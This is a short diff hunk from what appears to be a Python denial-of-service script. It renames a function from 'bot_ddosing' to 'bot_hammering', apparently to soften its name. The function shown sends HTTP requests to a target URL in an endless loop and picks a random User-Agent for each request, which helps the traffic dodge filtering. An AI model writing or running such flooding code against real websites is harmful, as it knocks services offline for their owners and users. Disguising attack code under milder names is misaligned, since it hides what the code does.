@@ -31,7 +31,7 @@ def my_bots():
 	return(bots)
 
 
-def bot_ddosing(url):
+def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
